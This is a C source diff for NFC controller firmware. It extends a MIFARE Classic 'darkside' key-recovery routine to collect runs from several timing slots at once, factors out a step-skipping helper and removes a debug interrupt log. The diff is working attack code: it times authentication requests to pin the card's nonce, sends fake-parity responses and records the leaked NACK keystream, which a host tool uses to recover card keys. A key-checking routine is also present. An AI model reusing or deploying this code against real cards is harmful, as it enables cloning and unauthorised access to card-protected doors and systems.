@@ -81,17 +81,9 @@ static struct {
 } capture;
 static u32 capturing;
 
-// Interrupt log while capturing: (timer << 8 | group, status) pairs, for debugging hangs.
-// Group 3 = TX started by us (status = length code).
-#define N_LOG 16
-static struct {
-	u32 count;
-	u32 ent[N_LOG][2];
-} irqlog;
-
 // The RF and timer interrupt groups: pass the status through unchanged (identity filter), the same
-// as the ROM would. (The per-interrupt trace that once lived here was removed to make room; irqlog
-// stays zero, so the OP_CAPTURE ABI and chipmon.irqs() are unchanged.)
+// as the ROM would. (The per-interrupt trace that once lived here, and OP_CAPTURE's pointer to it,
+// were removed to make room.)
 static u32 pass_filter(u32 status)
 {
 	return status;
@@ -323,18 +315,22 @@ static int send_steps(const u8 *steps, u32 ns)
 	return 1;
 }
 
+// Past the re-select steps (see send_steps) of a host-built arg.
+static const u8 *skip_steps(const u8 *q, u32 ns)
+{
+	while (ns--) q += 4 + q[3];
+	return q;
+}
+
 // arg: uid(4 BE) nr(4 BE) at_wait(u16 LE, timer ticks) nsteps(u8), per step: r574 code rx(0/1) len
 // bytes (parity on); then auth code, auth len, auth frame (parity off), nkeys, keys[6]. Returns the
 // index of the key whose {at} checked out (0xFF = none), keys tried, keys the card didn't select for.
 static u32 chkkeys(const u8 *arg, u32 n, u32 nrar, u8 *out)
 {
-	const u8 *end = arg + n, *q = arg + 11, *steps = q;
+	const u8 *end = arg + n, *steps = arg + 11;
 	if (n < 11) return 0;
 	u32 uid = get32be(arg), nr = get32be(arg + 4), atw = arg[8] | arg[9] << 8, ns = arg[10];
-	for (u32 i = 0; i < ns; i++) {
-		if (q + 4 > end) return 0;
-		q += 4 + q[3];
-	}
+	const u8 *q = skip_steps(steps, ns);
 	if (q + 2 > end || q + 2 + q[1] + 1 > end) return 0;
 	u32 acode = q[0], alen = q[1];
 	const u8 *aframe = q + 2;
@@ -378,97 +374,115 @@ static u32 chkkeys(const u8 *arg, u32 n, u32 nrar, u8 *out)
 // absolute time the way pm3 schedules on GetCountSspClk.
 #define NOW() ((u32)(0u - TIMER))
 
-// OP_DARKSIDE: one darkside run (NOTES.md, issue #2). The card leaks a 4-bit encrypted NACK to a
-// wrong {nr}{ar} regardless of parity (always-leak). Its PRNG free-runs, so the tag nonce is a function
-// of when the AUTH arrives: each AUTH fires on an absolute grid about one PRNG period (`sync` ticks,
-// host-calibrated) apart, steered like pm3's: lock onto the first nonce, and when another comes back
-// within DS_WIN steps of it, move the next fire by that many steps (phase) and fold a quarter of it into
-// the per-fire correction (the drift the integer grid leaves). On the locked nonce, send a fixed
-// {nr}{ar} for the next missing nt_diff (top 3 bits of nr byte 3) and record its NACK keystream. The
-// host intersects several runs (crapto1_darkside). {nr}{ar} uses auth()'s nrar framing.
-#define DS_WIN 48
+// OP_DARKSIDE: darkside runs (NOTES.md, issue #2). The card leaks a 4-bit encrypted NACK to a wrong
+// {nr}{ar} regardless of parity (always-leak). Its PRNG free-runs, so the tag nonce is a function of
+// when the AUTH arrives. AUTHs fire on an absolute grid `sync` ticks apart, a PRNG period (host-
+// calibrated) over nslot: slot i takes every nslot-th grid point, so each slot sees its own nonce once
+// a period and collects its own run. Steered like pm3's: a slot locks onto its first nonce, and when
+// another comes back within DS_WIN steps of it, moves its own fires by that many steps (phase); an
+// eighth of it goes into the per-fire correction all slots share (the drift the integer grid leaves).
+// On the locked nonce, send a fixed {nr}{ar} for the slot's next missing nt_diff (top 3 bits of nr byte
+// 3) and record its NACK keystream. The host intersects the runs (crapto1_darkside). {nr}{ar} uses
+// auth()'s nrar framing.
+#define DS_WIN   48
+#define DS_SLOTS 8
+
+struct dslot {
+	u32 target; // the locked nonce (the first one the slot saw)
+	s32 ph;     // the slot's phase, ticks * 256
+	u8 ks[8], mask, hits, lost, pad;
+};
 
 // arg: sync(u32 LE) sfracq(s16 LE, per-fire grid correction * 256) maxiter(u16 LE) atw(u16 LE, NACK
-// wait ticks) tq(u16 LE, ticks per PRNG step * 256) nsteps(u8), per step r574 code rx(0/1) len bytes
-// (parity on); acode(u8) alen(u8) aframe[alen] (AUTH, parity off); 8 * nrar[9] (parity off, nt_diff
-// 0..7). Returns nt (u32, the locked nonce) ks[8] (low nibble each) mask(u8, a bit per filled nt_diff,
-// 0xFF = complete) nt1 (u32, the second nonce: with nt the host's period calibration) hits(u8).
-static u32 darkside(const u8 *arg, u32 n, u32 nrar_tx, u8 *out)
+// wait ticks) tq(u16 LE, ticks per PRNG step * 256) nslot(u8) need(u8, slots to complete) nsteps(u8),
+// per step r574 code rx(0/1) len bytes (parity on); acode(u8) alen(u8) aframe[alen] (AUTH, parity
+// off); 8 * nrar[9] (parity off, nt_diff 0..7). Returns struct dslot per slot (ks: low nibble each;
+// mask: a bit per filled nt_diff, 0xFF = complete). Unsteered with 2 slots, the two targets are two
+// nonces a grid point apart: the host's period calibration.
+static u32 darkside(const u8 *arg, u32 n, u32 nrar_tx, struct dslot *ds)
 {
 	const u8 *end = arg + n;
-	if (n < 13) return 0;
+	if (n < 15) return 0;
 	u32 sync = get32(arg);
 	s32 sfr = (s16)(arg[4] | arg[5] << 8);
 	u32 maxiter = arg[6] | arg[7] << 8, atw = arg[8] | arg[9] << 8, tq = arg[10] | arg[11] << 8;
-	u32 ns = arg[12];
-	const u8 *steps = arg + 13, *q = steps;
-	for (u32 i = 0; i < ns; i++) q += 4 + q[3];
+	u32 nslot = arg[12], need = arg[13], ns = arg[14];
+	const u8 *steps = arg + 15, *q = skip_steps(steps, ns);
 	u32 acode = q[0], alen = q[1];
 	const u8 *aframe = q + 2;
 	q += 2 + alen;
 	const u8 *nrar = q;
-	if (nrar + 9 * 8 > end) return 0; // host builds a well-formed arg; just guard the frame reads
+	// host builds a well-formed arg; just guard the frame reads
+	if (nrar + 9 * 8 > end || !nslot || nslot > DS_SLOTS) return 0;
 
-	for (int i = 0; i < 18; i++) out[i] = 0;
-	u32 nsamp = 0, target = 0, lost = 0;
+	for (u32 i = 0; i < nslot * sizeof *ds; i++) ((u8 *)ds)[i] = 0;
+	u32 done = 0, slot = -1; // the first grid point is slot 0
 	u32 fire = NOW() + sync;
 	s32 facc = 0;
-	for (u32 iters = 0; iters < maxiter && out[12] != 0xFF; iters++) {
+	for (u32 iters = 0; iters < maxiter && done < need; iters++) {
 		REG(PARITY_REG) = 0;
 		if (!send_steps(steps, ns)) continue;
 		// Fire on the absolute grid (the nonce depends on timing only, not on how long the re-select
-		// took): sync plus the fractional correction; the next grid point if the re-select overran.
+		// took): sync plus the fractional correction; the next grid point (slot) if the re-select
+		// overran.
 		fire += sync;
+		slot++;
 		facc += sfr;
 		s32 cr = facc >> 8;
 		fire += cr;
 		facc -= cr << 8;
-		while ((s32)(fire - (NOW() + 32)) < 0) fire += sync;
-		while ((s32)(NOW() - fire) < 0)
+		while ((s32)(fire - (NOW() + 32)) < 0) fire += sync, slot++;
+		while (slot >= nslot) slot -= nslot; // no divide on the M0
+		struct dslot *d = &ds[slot];
+		u32 t = fire + (d->ph >> 8);
+		while ((s32)(NOW() - t) < 0)
 			;
 		REG(PARITY_REG) = PARITY_OFF;
 		u32 seen = capture.count, nt;
 		txraw(0, 1, acode, 0x88, aframe, alen);
 		if (!wait_rx(seen, 20000) || !recv_nt(&nt)) continue;
-		if (nsamp < 2) put32(out + 13 * nsamp++, nt); // nt (until locked), nt1: the host's calibration
-		if (!target) target = nt;
+		if (!d->target) d->target = nt;
 		// The card's clock stops in the reader's modulation pauses, so every frame sent costs PRNG
-		// steps (~180 for {nr}{ar}): send {nr}{ar} every time, on target or not, to keep the per-fire
-		// advance the same. A fixed {nr}{ar} for the next missing nt_diff c (fake parity).
+		// steps (~180 for {nr}{ar}): send {nr}{ar} every time, on target or not, and keep firing the
+		// slots that are complete, to keep the per-fire advance the same. A fixed {nr}{ar} for the next
+		// missing nt_diff c (fake parity).
 		u32 c = 0;
-		while (out[12] & 1 << c) c++;
+		while (c < 7 && d->mask >> c & 1) c++;
 		u32 s2 = capture.count;
 		txraw(0, nrar_tx >> 8 & 0xFF, nrar_tx & 0xFF, 0x88, nrar + 9 * c, 9);
 		u32 got = wait_rx(s2, atw);
-		if (nt == target) {
-			lost = 0;
-			out[17]++;
+		if (d->mask == 0xFF) continue;
+		if (nt == d->target) {
+			d->lost = 0;
+			d->hits++;
 			if (got) { // the NACK ^ 0x05 is the keystream nibble
 				struct frame *f = &capture.ring[(*(volatile u32 *)&capture.count - 1) % N_FRAMES];
-				if (f->len >= 1) out[4 + c] = (f->data[0] & 0xF) ^ 0x5, out[12] |= 1 << c;
+				if (f->len >= 1) {
+					d->ks[c] = (f->data[0] & 0xF) ^ 0x5;
+					if ((d->mask |= 1 << c) == 0xFF) done++;
+				}
 			}
 			continue;
 		}
 		// steps from the target to nt (+ = fired late), within DS_WIN
 		s32 dd = 0;
-		u32 x = target, y = nt;
+		u32 x = d->target, y = nt;
 		for (s32 i = 1; i <= DS_WIN && !dd; i++) {
 			x = prng_successor(x, 1), y = prng_successor(y, 1);
 			if (x == nt) dd = i;
-			if (y == target) dd = -i;
+			if (y == d->target) dd = -i;
 		}
 		if (!dd) { // lost it: after a few, lock onto where the nonce is now
-			if (++lost > 3) target = nt, out[12] = 0, lost = 0;
+			if (++d->lost > 3) d->target = nt, d->mask = 0, d->lost = 0;
 			continue;
 		}
-		lost = 0;
+		d->lost = 0;
 		s32 cc = dd * (s32)tq;
-		facc -= cc;
-		sfr -= cc >> 2;
+		d->ph -= cc;
+		sfr -= cc >> 3;
 	}
-	put32(out, target);
 	REG(PARITY_REG) = 0;
-	return 18;
+	return nslot * sizeof *ds;
 }
 
 // (OP_SNAP, the framer snapshot used once for NFC-V exploration, was removed to make room for the
@@ -486,7 +500,8 @@ static int hook(u8 *msg)
 	}
 	u32 addr = get32(p + 1), n = len - 5;
 	const u8 *arg = p + 5;
-	static u8 buf[MAX_DATA]; // not on the stack: the NCI task stack size is unknown
+	// not on the stack: the NCI task stack size is unknown; aligned for OP_DARKSIDE's structs
+	static u8 buf[MAX_DATA] __attribute__((aligned(4)));
 
 	switch (p[0]) {
 	case OP_READ8:
@@ -522,8 +537,7 @@ static int hook(u8 *msg)
 		RF_FILTER = (u32)pass_filter;
 		TMR_FILTER = (u32)pass_filter;
 		put32(buf, (u32)&capture);
-		put32(buf + 4, (u32)&irqlog);
-		reply(0, buf, 8);
+		reply(0, buf, 4);
 		return 1;
 	case OP_TXRAW:
 		if (n < 4) break;
@@ -578,7 +592,7 @@ static int hook(u8 *msg)
 		return 1;
 	}
 	case OP_DARKSIDE: {
-		u32 r = darkside(arg, n, addr & 0xFFFF ? addr & 0xFFFF : 0x178, buf);
+		u32 r = darkside(arg, n, addr & 0xFFFF ? addr & 0xFFFF : 0x178, (struct dslot *)buf);
 		if (!r) break;
 		reply(0, buf, r);
 		return 1;
